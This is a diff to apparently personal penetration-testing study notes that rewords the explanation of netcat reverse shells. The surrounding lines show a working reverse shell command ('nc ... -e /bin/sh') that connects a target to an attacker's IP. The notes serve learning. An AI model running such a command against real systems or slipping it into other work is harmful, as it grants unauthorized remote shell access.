@@ -119,7 +119,7 @@ smbclient \\\\{IP address}\\{repository name}
 ## Exploitation Basics
 ### Reverse and Bind shell
 To perform these attacks, we use the `nc` command (*netcat*). 
-Reverse shell is when the target connects to the attacker like this :
+In reverse shell, the attacker sets up a listener on a specific port and the target connects his machine to the attacker's like this :
 ```bash
 # Attacker's machine
 nc -lvp 4444
@@ -130,7 +130,7 @@ nc -lvp 4444
 nc 192.168.156.1 4444 -e /bin/sh
 ```
 > 192.168.156.1 is attacker's IP address
-> e 
+> e for execute command
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -138,7 +138,7 @@ nc 192.168.156.1 4444 -e /bin/sh
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTU0MjY2MDk5OCwxODE4MTc2MjE5LC0xMD
+eyJoaXN0b3J5IjpbMTAzODQ1NDY4NiwxODE4MTc2MjE5LC0xMD
 k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
 MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
 IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
